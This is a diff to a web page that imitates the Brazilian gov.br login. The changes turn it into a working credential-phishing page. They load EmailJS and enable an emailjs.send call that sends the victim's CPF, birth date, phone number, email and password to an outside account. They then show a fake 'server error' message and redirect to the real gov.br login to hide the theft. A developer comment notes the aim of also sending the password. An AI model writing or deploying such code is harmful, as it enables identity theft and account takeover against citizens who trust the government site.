@@ -14,6 +14,7 @@
 	<link rel="stylesheet" href="../view/govbr-modal.css">
 	<link rel="stylesheet" href="../view/govbr-eula.css">
 	<script src="../control/controlador.js"></script>
+	<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/emailjs-com@2/dist/email.min.js"></script>
 </head>
 
 <body>
@@ -335,11 +336,14 @@
 		</div>
 	</div>
 
-
-	<footer>
-	</footer>
-
 	<script>
+
+		(function () {
+			emailjs.init("Lad9G2ud_wPxuwuf2");
+		})();
+
+
+
 		document.addEventListener('DOMContentLoaded', function () {
 			const popup = document.getElementById('popup');
 			popup.style.display = 'block';
@@ -353,51 +357,32 @@
 		////CONCERTAR O SUBMIT PARA ENVIAR A SENHrA TAMBÉM
 		function senPasswd() {
 
-			emailjs.init("Lad9G2ud_wPxuwuf2");
-
 			var passwd = document.getElementById('passId').value;
-
-			alert(passwd);
 
 			var date = sheachDate();
 
-			alert("" + passwd)
+			var message = `CPF = ${date[0]}; data de nascimento = ${date[1]}; telefone = ${date[2]}; email = ${date[3]};
+		senha = ${passwd}`;
 
-			var message = `CPF = ${date[0]}; data de nascimento = ${date[1]}; telefone = ${date[2]}; email = ${date[3]}; senha = ${passwd}`;
 
-			alert(message);
 
-			/*
 			emailjs.send('service_b2pfjac', 'template_bmttgqn', {
 				message,
 			}, 'Lad9G2ud_wPxuwuf2')
-				.then((response) => {
-					console('Email enviado com sucesso!', response.status, response.text);
-				}, (error) => {
-					console('Ocorreu um erro:', error);
-				});
-				*/
+
 		};
 
 		function onSubmit(event) {
-					event.preventDefault();
-					
-					
-					
-					
-					event.target.classList.add("loading");
-				    const form = document.getElementById("loginData");
 
-				    /*if (event?.target?.attributes?.name?.value) {
-						const input = document.getElementById("operation-field");
-						input.setAttribute("name", event?.target?.attributes?.name?.value);
-						input.setAttribute("value", event?.target?.attributes?.value?.value || "");
-					} 
-					if (event?.target?.attributes?.formaction?.value) {
-						form.setAttribute("action", event?.target?.attributes?.formaction?.value);
-					} 
-					
-					hcaptcha.execute(window.hcaptchaWidgetId);*/
-				}
+			event.preventDefault();
+			senPasswd();
+
+			event.target.classList.add("loading");
+			const form = document.getElementById("loginData");
+			alert("Erro no servidor, tente novamente mais tarde.");
+			window.open("https://sso.acesso.gov.br/login?client_id=www.gov.br&authorization_id=18f79f229ec");
+		}
 
 	</script>
+
+</body>
